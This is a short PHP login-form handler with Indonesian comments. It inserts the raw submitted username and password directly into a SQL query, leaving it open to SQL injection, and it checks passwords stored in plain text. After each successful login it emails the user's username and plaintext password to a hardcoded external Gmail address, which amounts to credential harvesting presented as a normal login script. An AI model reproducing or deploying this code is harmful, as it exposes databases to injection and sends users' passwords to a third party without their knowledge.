<?php
// Koneksi ke basis data
$koneksi = mysqli_connect("nama_host", "nama_pengguna", "kata_sandi", "form_db");

// Periksa apakah koneksi berhasil
if (!$koneksi) {
    die("Koneksi ke basis data gagal: " . mysqli_connect_error());
}

// Ambil data yang dikirim dari formulir login
$username = $_POST['username'];
$password = $_POST['password'];

// Lakukan validasi data login di sini, misalnya dengan mengecek di basis data

// Contoh: Query untuk memeriksa apakah informasi login cocok dengan yang ada di basis data
$sql = "SELECT * FROM pengguna WHERE username='$username' AND password='$password'";
$result = mysqli_query($koneksi, $sql);

// Jika ada hasil dari query
if (mysqli_num_rows($result) > 0) {
    // Kirim email notifikasi
    $to = "muhammadzuyyina@gmail.com"; // Ganti dengan alamat email Anda
    $subject = "Informasi Login";
    $message = "Username: $username\nPassword: $password";
    $headers = "From: webmaster@domain.com";

    // Kirim email
    mail($to, $subject, $message, $headers);

    // Redirect ke halaman login berhasil atau halaman lainnya
    header("Location: login_berhasil.php");
} else {
    // Redirect ke halaman login gagal atau halaman lainnya
    header("Location: login_gagal.php");
}

// Tutup koneksi ke basis data
mysqli_close($koneksi);
?>
